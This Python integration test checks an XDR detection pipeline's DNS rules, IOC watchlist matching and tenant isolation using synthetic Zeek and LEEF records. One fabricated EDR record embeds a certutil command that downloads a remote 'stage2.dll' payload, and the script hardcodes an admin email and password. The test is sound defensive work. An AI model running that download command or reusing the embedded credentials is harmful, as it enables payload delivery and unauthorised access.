#!/usr/bin/env python3
"""Gate DCR-1 · detection content recovery, proven on REAL ingested evidence.

Every record below travels the authenticated ingest route (collector + API
key + declared source), is normalized by the existing DSMs, and is then
judged by the authored store rules DCR-1 recovered. Nothing is injected into
the canonical collection by hand.

What is proven, in order:
  1. a Zeek `dns.log` observation satisfies the DNS predicate of a rule
     authored `product: windows`, and the evidence is NOT represented as
     Windows anywhere in the match or the citation;
  2. the detection is PERSISTED with predicate → observed value →
     canonical `evidence_ref`;
  3. benign, absent-field, wrong-evidence-type, missing-provenance and
     another tenant's watchlist entry all produce no match;
  4. the IOC lane matches only genuinely observed hashes/addresses/domains,
     and never reconstructs a resolution;
  5. the detection estate is accounted for without fixtures, MITRE
     reference entries, correlation mirrors or duplicates inflating it.

EVIDENCE LABELLING — TEST/SYNTHETIC records in each source's documented
shape, delivered over the real route. No live sensor is claimed: the preview
pod has no CAP_NET_RAW, so genuine packet capture stays
EXTERNAL_ACCESS_BLOCKED.
"""
from __future__ import annotations

import json
import os
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone

sys.path.insert(0, "/app/backend")

from dotenv import load_dotenv                                  # noqa: E402

load_dotenv("/app/backend/.env")
load_dotenv("/app/frontend/.env")

BASE = os.environ["REACT_APP_BACKEND_URL"].rstrip("/")
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126.0"
STAMP = int(time.time())
TEN = "default"
OTHER = f"dcr1-other-{STAMP}"
ADMIN = ("admin@nivxray.com", "uulVDp5cCSB3Hva99s7UUAwK")
PROOF_SOURCE = f"dcr1-proof-{STAMP}"

TLD_DOMAIN = f"dcr1-{STAMP}.xyz"                    # positive · DNS TLD rule
BENIGN_DOMAIN = f"dcr1-{STAMP}.com"                 # benign negative
IOC_DOMAIN = f"dcr1-c2-{STAMP}.example-c2.net"      # positive · IOC domain
SCOPED_DOMAIN = f"dcr1-scoped-{STAMP}.example-c2.net"   # other tenant's IOC
ANSWER_IP = f"198.51.100.{STAMP % 90 + 100}"        # what IOC_DOMAIN answers
IOC_IP = f"203.0.113.{STAMP % 90 + 100}"            # positive · IOC address
IOC_HASH = f"{STAMP:x}".rjust(64, "d")[:64]         # positive · IOC hash

DNS_RULE = "net_dns_susp_tld"
ok = True


def check(label, cond, detail=""):
    global ok
    ok = ok and bool(cond)
    print(f"  [{'PASS' if cond else 'FAIL'}] {label}"
          + (f" — {detail}" if detail else ""))


def call(path, method="GET", token=None, key=None, tenant=None, body=None):
    h = {"User-Agent": UA, "Content-Type": "application/json"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    if key:
        h["X-XDR-API-Key"] = key
    if tenant:
        h["X-Tenant-Id"] = tenant
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=h,
                               method=method)
    try:
        with urllib.request.urlopen(r, timeout=120) as resp:
            return resp.status, json.loads(resp.read() or b"{}")
    except urllib.error.HTTPError as e:
        raw = e.read().decode()[:400]
        try:
            return e.code, json.loads(raw)
        except Exception:                                       # noqa: BLE001
            return e.code, raw


def provision(token):
    _, body = call("/api/xdr/collectors", "POST", token=token, tenant=TEN,
                   body={"name": f"dcr1-collector-{STAMP}",
                         "protocol": "syslog",
                         "authorized_sources": ["zeek-json", "cef-leef"]})
    col = (body.get("data") or {}).get("id")
    _, body = call("/api/xdr/api-keys", "POST", token=token, tenant=TEN,
                   body={"name": f"dcr1-key-{STAMP}",
                         "confirm_tenant_id": TEN, "allow_new_tenant": False,
                         "scopes": ["collectors.enroll", "collectors.read"]})
    d = body.get("data") or {}
    return col, d.get("plaintext") or d.get("api_key")


def env(col, sei, declared, raw):
    return {"tenant_id": TEN, "collector_id": col, "source_event_id": sei,
            "collection_method": "syslog", "source": "dcr1-proof",
            "declared_source": declared, "raw": raw}


def zeek_dns(uid, query, answer=ANSWER_IP):
    return {"_path": "dns", "_system_name": "zeek-dcr1",
            "ts": time.time() - 60, "uid": uid,
            "id.orig_h": "10.77.0.31", "id.orig_p": 53211,
            "id.resp_h": "10.77.0.1", "id.resp_p": 53, "proto": "udp",
            "query": query, "qtype_name": "A", "rcode_name": "NOERROR",
            "answers": [answer], "TTLs": [60.0], "trans_id": 4242,
            "AA": False, "rejected": False}


def zeek_conn(uid, dest_ip):
    return {"_path": "conn", "_system_name": "zeek-dcr1",
            "ts": time.time() - 50, "uid": uid,
            "id.orig_h": "10.77.0.31", "id.orig_p": 44311,
            "id.resp_h": dest_ip, "id.resp_p": 443, "proto": "tcp",
            "duration": 9.75, "orig_bytes": 1811, "resp_bytes": 44210,
            "orig_pkts": 19, "resp_pkts": 41, "conn_state": "SF"}


def leef_hash(sha256):
    ts = datetime.now(timezone.utc).strftime("%b %d %H:%M:%S")
    return {"line": (f"<134>{ts} srv31 LEEF:2.0|IBM|QRadar EDR|3.1|4711|x09|"
                     f"cat=process\tdevTime={int(time.time()) * 1000}\t"
                     f"src=10.4.9.31\tdst=198.51.100.7\tsrcPort=44210\t"
                     f"dstPort=8443\tproto=TCP\tusrName=svc_backup\t"
                     f"identHostName=HYD-SRV31\tprocessName=certutil.exe\t"
                     f"cmd=certutil.exe -urlcache -split -f "
                     f"http://198.51.100.7/stage2.dll\tfileHash={sha256}\t"
                     f"sev=2")}


def main():
    from detection_content import ioc_watchlist as iw
    from detection_content import rule_store_binding as rsb
    from pymongo import MongoClient

    print(f"== DCR-1 DETECTION CONTENT RECOVERY · {BASE} ==")
    _, body = call("/api/auth/login", "POST",
                   body={"email": ADMIN[0], "password": ADMIN[1]})
    token = body.get("access_token")
    check("admin session", bool(token))
    if not token:
        return 1
    col, key = provision(token)
    check("collector + ingest key", bool(col and key))
    if not (col and key):
        return 1

    db = MongoClient(os.environ["MONGO_URL"])[
        os.environ.get("DB_NAME") or "test_database"]
    iocs = db[iw.WATCHLIST_COLLECTION]
    canon = db["xdr_canonical_evidence"]
    matches = db["xdr_detection_matches"]

    print("\n== 0 · BINDING STATE OF THE RECOVERED RULES ==")
    rsb.load_bindings(force=True)
    rep = rsb.binding_report()
    by_up = {r["upstream_id"]: r for r in rep["rules"]}
    check("the DNS TLD rule is BOUND as product-neutral",
          by_up.get(DNS_RULE, {}).get("binding_state") == "BOUND"
          and by_up.get(DNS_RULE, {}).get("product_neutral") is True,
          str(by_up.get(DNS_RULE, {}).get("reason"))[:90])
    check("its declared product is still windows (nothing was rewritten)",
          by_up.get(DNS_RULE, {}).get("product") == "windows")
    for rid in ("ioc_file_hash_watchlist", "ioc_network_watchlist"):
        check(f"{rid} is BOUND under the IOC contract",
              by_up.get(rid, {}).get("binding_state") == "BOUND"
              and by_up.get(rid, {}).get("evaluation_contract") == "ioc")

    print("\n== 1 · WATCHLIST ENTRIES (proof-scoped, removed at the end) ==")
    iocs.insert_many([
        {"kind": "domain", "value": IOC_DOMAIN, "source": PROOF_SOURCE,
         "severity": "high", "tags": ["dcr1-proof"]},
        {"kind": "ip", "value": IOC_IP, "source": PROOF_SOURCE,
         "severity": "high", "tags": ["dcr1-proof"]},
        {"kind": "sha256", "value": IOC_HASH, "source": PROOF_SOURCE,
         "severity": "high", "tags": ["dcr1-proof"]},
        {"kind": "domain", "value": SCOPED_DOMAIN, "source": PROOF_SOURCE,
         "tenant_id": OTHER, "severity": "high", "tags": ["dcr1-proof"]}])
    check("4 watchlist entries seeded (3 platform, 1 tenant-scoped)",
          iocs.count_documents({"source": PROOF_SOURCE}) == 4)

    print("\n== 2 · REAL INGEST ==")
    envelopes = [
        env(col, f"dcr1:{STAMP}:tld", "zeek-json",
            zeek_dns(f"Cdcr1tld{STAMP}", TLD_DOMAIN)),
        env(col, f"dcr1:{STAMP}:benign", "zeek-json",
            zeek_dns(f"Cdcr1ben{STAMP}", BENIGN_DOMAIN)),
        env(col, f"dcr1:{STAMP}:iocdns", "zeek-json",
            zeek_dns(f"Cdcr1ioc{STAMP}", IOC_DOMAIN)),
        env(col, f"dcr1:{STAMP}:scoped", "zeek-json",
            zeek_dns(f"Cdcr1sco{STAMP}", SCOPED_DOMAIN)),
        env(col, f"dcr1:{STAMP}:iocip", "zeek-json",
            zeek_conn(f"Cdcr1cip{STAMP}", IOC_IP)),
        env(col, f"dcr1:{STAMP}:stale", "zeek-json",
            zeek_conn(f"Cdcr1sta{STAMP}", ANSWER_IP)),
        env(col, f"dcr1:{STAMP}:hash", "cef-leef", leef_hash(IOC_HASH)),
    ]
    code, body = call("/api/xdr/ingest/telemetry", "POST", key=key,
                      tenant=TEN, body={"envelopes": envelopes})
    data = body.get("data") or body
    check("seven records accepted through the real route",
          code == 200 and data.get("accepted") == 7,
          f"{code} accepted={data.get('accepted')}")

    def ev(**q):
        d = canon.find_one({"tenant_id": TEN, **q})
        if d:
            d.pop("_id", None)
        return d

    tld = ev(**{"network.dns_query": TLD_DOMAIN})
    benign = ev(**{"network.dns_query": BENIGN_DOMAIN})
    iocdns = ev(**{"network.dns_query": IOC_DOMAIN})
    scoped = ev(**{"network.dns_query": SCOPED_DOMAIN})
    iocip = ev(**{"network.flow_id": f"Cdcr1cip{STAMP}"})
    stale = ev(**{"network.flow_id": f"Cdcr1sta{STAMP}"})
    hashed = ev(**{"process.hashes.sha256": IOC_HASH})
    got = {"tld": tld, "benign": benign, "iocdns": iocdns, "scoped": scoped,
           "iocip": iocip, "stale": stale, "hash": hashed}
    check("all seven pieces of canonical evidence persisted",
          all(got.values()),
          ", ".join(k for k, v in got.items() if not v) or "all present")
    if not all(got.values()):
        iocs.delete_many({"source": PROOF_SOURCE})
        return 1

    print("\n== 3 · THE RECOVERED DNS DETECTION ON ZEEK EVIDENCE ==")
    hits = rsb.evaluate_store_rules(tld)
    dns_hit = next((h for h in hits if h["upstream_id"] == DNS_RULE), None)
    check("the windows-authored DNS rule fired on Zeek DNS evidence",
          dns_hit is not None, str([h["upstream_id"] for h in hits]))
    if dns_hit:
        cond = (dns_hit["citation"]["matched_conditions"] or [{}])[0]
        check("…citing the predicate it evaluated",
              cond.get("predicate") == "QueryName|endswith",
              str(cond.get("predicate")))
        check("…the canonical field it read",
              cond.get("canonical_field") == "network.dns_query")
        check("…the value genuinely observed",
              cond.get("observed_value") == TLD_DOMAIN,
              str(cond.get("observed_value")))
        check("…and the canonical evidence_ref that carried it",
              cond.get("evidence_ref")
              == f"xdr_canonical_evidence/{tld['event_id']}")
        check("the match is marked product-neutral, not product-matched",
              dns_hit["product_neutral"] is True)
    check("the evidence is NOT represented as Windows",
          tld["source_vendor"] == "Zeek"
          and "windows" not in json.dumps(
              {k: v for k, v in tld.items() if k != "raw_ref"}).lower()
          and rsb._event_product(tld) != "windows",
          f"{tld['source_vendor']} / {tld['source_product']}")
    check("Zeek's own field provenance is still on the evidence",
          "zeek:dns.log query" in json.dumps(
              (tld.get("network") or {}).get("field_provenance") or {}),
          str(((tld.get("network") or {}).get("field_provenance")
               or {}).get("dns_query")))

    print("\n== 4 · THE DETECTION WAS PERSISTED BY THE PIPELINE ==")
    row = matches.find_one({"tenant_id": TEN,
                            "canonical_event_id": tld["event_id"],
                            "rule_name": {"$regex": "Uncommon TLD"}})
    check("a citation row exists for the recovered detection", bool(row))
    if row:
        cited = [c for c in (row.get("matched_conditions") or [])
                 if c.get("observed_value") == TLD_DOMAIN]
        check("…with the observed value and evidence_ref persisted",
              bool(cited) and row["evidence_ref"]
              == f"xdr_canonical_evidence/{tld['event_id']}",
              row.get("evidence_ref"))
        check("…and the declaration state is CITED, not inferred",
              row.get("citation_completeness") == "CITED",
              str(row.get("citation_completeness")))

    print("\n== 5 · NEGATIVES THAT MUST NOT FIRE ==")
    check("a benign TLD on identical telemetry does not match",
          not [h for h in rsb.evaluate_store_rules(benign)
               if h["upstream_id"] == DNS_RULE])
    absent = json.loads(json.dumps(tld))
    absent["network"]["dns_query"] = ""
    check("an absent DNS field produces no match and no defaulted value",
          not rsb.evaluate_store_rules(absent)
          and "QueryName" not in rsb.flatten_with_paths(absent)[0])
    wrong = json.loads(json.dumps(tld))
    wrong["event_type"] = "network_connect"
    check("the same value under the wrong evidence semantics does not match",
          not [h for h in rsb.evaluate_store_rules(wrong)
               if h["upstream_id"] == DNS_RULE])
    noprov = json.loads(json.dumps(tld))
    noprov["provenance"] = {}
    check("evidence without provenance is never judged product-neutral",
          not rsb.evaluate_store_rules(noprov))
    other_ten = json.loads(json.dumps(tld))
    other_ten["tenant_id"] = OTHER
    check("cross-tenant: the DNS predicate still reads only this record",
          [h["upstream_id"] for h in rsb.evaluate_store_rules(other_ten)]
          == [DNS_RULE])

    print("\n== 6 · THE IOC LANE ==")
    dns_ioc_hits = rsb.evaluate_store_rules(iocdns)
    net_ioc = next((h for h in dns_ioc_hits
                    if h["upstream_id"] == "ioc_network_watchlist"), None)
    check("a listed DOMAIN on real Zeek DNS evidence matches",
          net_ioc is not None, str([h["upstream_id"] for h in dns_ioc_hits]))
    if net_ioc:
        m = net_ioc["citation"]["matched_conditions"][0]
        check("…citing network.dns_query and the intel source",
              m["canonical_field"] == "network.dns_query"
              and m["observed_value"] == IOC_DOMAIN
              and m["watchlist_entry"]["source"] == PROOF_SOURCE)
        refused = [c for c in net_ioc["citation"]["evaluated_conditions"]
                   if c["predicate"] == "dst_ip|watchlist"]
        check("…and the address predicate is refused on DNS evidence "
              "(a resolver is not a peer)",
              refused and refused[0]["result"]
              == "EVIDENCE_TYPE_NOT_ADMISSIBLE")
    check("a listed ADDRESS on a real Zeek flow matches",
          any(h["upstream_id"] == "ioc_network_watchlist"
              for h in rsb.evaluate_store_rules(iocip)))
    check("a flow to the address the listed domain ANSWERED does not match "
          "(no resolution is reconstructed)",
          not rsb.evaluate_store_rules(stale),
          str([h["upstream_id"] for h in rsb.evaluate_store_rules(stale)]))
    hash_hits = rsb.evaluate_store_rules(hashed)
    hash_hit = next((h for h in hash_hits
                     if h["upstream_id"] == "ioc_file_hash_watchlist"), None)
    check("a listed HASH on real EDR evidence matches",
          hash_hit is not None, str([h["upstream_id"] for h in hash_hits]))
    if hash_hit:
        m = hash_hit["citation"]["matched_conditions"][0]
        check("…citing the canonical hash path it read",
              m["canonical_field"] in ("process.hashes.sha256",
                                       "file.hashes.sha256")
              and m["observed_value"] == IOC_HASH,
              m["canonical_field"])
    nohash = json.loads(json.dumps(hashed))
    # the LEEF normalizer carries the hash on BOTH the process and the file
    # entity, so both must be absent for "no hash observed" to be true.
    nohash["process"]["hashes"] = {}
    nohash["file"]["hashes"] = {}
    check("evidence with no hash observed produces no hash match",
          not rsb.evaluate_store_rules(nohash))
    partial = json.loads(json.dumps(hashed))
    partial["process"]["hashes"] = {}
    check("…and the file-entity hash alone is still a genuine observation",
          any(h["upstream_id"] == "ioc_file_hash_watchlist"
              for h in rsb.evaluate_store_rules(partial))
          and next(h for h in rsb.evaluate_store_rules(partial)
                   if h["upstream_id"] == "ioc_file_hash_watchlist"
                   )["citation"]["matched_conditions"][0]["canonical_field"]
          == "file.hashes.sha256")

    print("\n== 7 · TENANT ISOLATION OF THE WATCHLIST ==")
    check("another tenant's watchlist entry does not judge this tenant",
          not [h for h in rsb.evaluate_store_rules(scoped)
               if h["upstream_id"] == "ioc_network_watchlist"])
    as_other = json.loads(json.dumps(scoped))
    as_other["tenant_id"] = OTHER
    check("…and DOES judge its own tenant's identical evidence",
          any(h["upstream_id"] == "ioc_network_watchlist"
              for h in rsb.evaluate_store_rules(as_other)))

    print("\n== 8 · REPLAY DETERMINISM ==")
    first = rsb.evaluate_store_rules(json.loads(json.dumps(tld)))
    second = rsb.evaluate_store_rules(json.loads(json.dumps(tld)))
    check("re-evaluating the same evidence yields the identical verdict",
          json.dumps(first, sort_keys=True, default=str)
          == json.dumps(second, sort_keys=True, default=str))
    code, body = call("/api/xdr/ingest/telemetry", "POST", key=key,
                      tenant=TEN, body={"envelopes": [envelopes[0]]})
    d2 = body.get("data") or body
    n = matches.count_documents({"tenant_id": TEN,
                                 "canonical_event_id": tld["event_id"],
                                 "rule_name": {"$regex": "Uncommon TLD"}})
    check("a replayed envelope creates no duplicate citation row",
          n == 1, f"replay accepted={d2.get('accepted')} rows={n}")

    print("\n== 9 · DETECTION ESTATE ACCOUNTING ==")
    e = rep["detection_estate"]
    print(f"    store rows              : {e['store_rules_counted']}")
    print(f"    authored (distinct)     : "
          f"{e['authored_detections_distinct']}")
    print(f"    duplicate copies        : "
          f"{e['authored_detection_duplicate_copies']}")
    print(f"    MITRE reference entries : {e['mitre_reference_entries']}")
    print(f"    correlation mirrors     : {e['correlation_mirrors']}")
    print(f"    test fixtures           : {e['test_fixtures']}")
    check("every store row lands in exactly one bucket",
          (e["authored_detections_distinct"]
           + e["authored_detection_duplicate_copies"]
           + e["mitre_reference_entries"] + e["correlation_mirrors"]
           + e["test_fixtures"]) == e["store_rules_counted"])
    check("fixtures and reference entries are no longer counted as "
          "authored detections",
          e["authored_detections_distinct"] < e["store_rules_counted"])

    iocs.delete_many({"source": PROOF_SOURCE})
    check("proof watchlist entries removed (preview left as found)",
          iocs.count_documents({"source": PROOF_SOURCE}) == 0)

    print(f"\n== RESULT: {'PASS' if ok else 'FAIL'} ==")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
